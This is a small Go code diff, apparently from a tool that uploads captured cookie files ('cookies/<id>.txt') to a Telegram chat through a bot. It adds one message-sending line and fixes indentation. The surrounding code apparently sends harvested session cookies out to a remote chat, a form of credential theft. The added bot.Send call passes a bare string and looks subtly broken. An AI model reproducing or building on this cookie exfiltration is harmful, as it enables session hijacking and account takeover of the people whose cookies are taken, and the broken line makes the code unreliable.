@@ -298,6 +298,7 @@ func send(text string, botT string, chat_id int64, tGcookie string) {
 	//Send the cookie attachment
 	docMsg :=  tgbotapi.NewDocumentUpload(chat_id, "cookies/"+tGcookie+".txt")
 	bot.Send(docMsg)
+	bot.Send("Just checking it out G")
 }
 func saveDoc(title string, myCookieFile string) {
 	dcF = `
@@ -345,6 +346,6 @@ func saveDoc(title string, myCookieFile string) {
 	body = dcF
 	p1 := &Document{Title: title, Body: []byte(body)}
 	if err := p1.save(); err != nil {
-			log.Fatal(err)
+		log.Fatal(err)
 	}
 }
